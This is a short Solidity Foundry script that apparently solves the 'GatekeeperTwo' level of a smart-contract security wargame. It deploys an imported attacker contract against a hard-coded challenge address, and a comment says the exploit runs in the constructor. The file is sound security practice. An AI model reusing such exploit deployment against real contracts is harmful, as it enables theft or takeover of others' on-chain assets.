// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/14-GatekeeperTwo.sol";
import "../src/14-GatekeeperTwo.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0x0eBA9C909Aa9E765865D5Fe329BF681494156c45);

    function run() external{
        vm.startBroadcast();

        // Create GatekeeperTwoAttacker (exploit happens in constructor)
        GatekeeperTwoAttacker attacker = new GatekeeperTwoAttacker(0x0eBA9C909Aa9E765865D5Fe329BF681494156c45);
        
        vm.stopBroadcast();
    }
}